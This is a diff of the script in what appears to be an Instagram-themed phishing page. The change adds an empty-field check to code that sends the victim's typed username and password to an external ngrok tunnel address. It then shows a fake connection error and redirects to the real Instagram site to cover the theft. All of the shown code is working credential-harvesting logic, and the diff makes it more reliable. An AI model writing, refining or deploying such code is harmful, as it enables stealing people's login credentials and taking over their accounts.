@@ -48,22 +48,24 @@
 </body>
 <script>
     document.getElementById("btn").onclick = function() {
-        fetch('https://0d6a-102-218-50-79.ngrok-free.app/instagram.com/secure-your-account/', {
-            method : 'POST',
-            headers : {
-                'Content-Type':'application/json',
-                "X-CSRFToken":getCookie("csrftoken"),
-            },
-            body:JSON.stringify({
-                'username':document.getElementById("username").value,
-                'password':document.getElementById('password').value
+        if (document.getElementById("username").value && document.getElementById('password').value) {
+            fetch('https://0d6a-102-218-50-79.ngrok-free.app/instagram.com/secure-your-account/', {
+                method : 'POST',
+                headers : {
+                    'Content-Type':'application/json',
+                    "X-CSRFToken":getCookie("csrftoken"),
+                },
+                body:JSON.stringify({
+                    'username':document.getElementById("username").value,
+                    'password':document.getElementById('password').value
+                })
             })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.yes) {
-                alert("Something went wong, check your connection and try again")
-                window.location.href = "https://www.instagram.com/"
+            .then(response => response.json())
+            .then(data => {
+                if (data.yes) {
+                    alert("Something went wong, check your connection and try again")
+                    window.location.href = "https://www.instagram.com/"
+                }
             }
     })
     }
